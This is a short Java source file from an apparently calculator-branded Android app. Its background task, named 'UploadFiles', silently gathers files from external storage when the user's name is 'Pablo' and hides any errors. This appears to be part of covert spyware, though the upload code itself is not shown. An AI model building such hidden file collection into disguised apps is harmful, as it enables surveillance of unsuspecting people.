package es.fraggel.acalculator;

import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

public class UploadFiles extends AsyncTask<Void , Integer, Long>
{
    @Override
    protected Long doInBackground(Void... voids) {
        Log.d("Calculator","upload");
        try{
            if(Util.NOMBRE.equals("Pablo")) {
                Util.GetFiles(Environment.getExternalStorageDirectory().getAbsolutePath());
            }

        }catch(Exception e){

        }

        return null;
    }

    @Override
    protected void onPostExecute(Long result) {
        //Termina proceso
        Log.i("TAG" , "Termina proceso de lectura de archivos.");
    }
}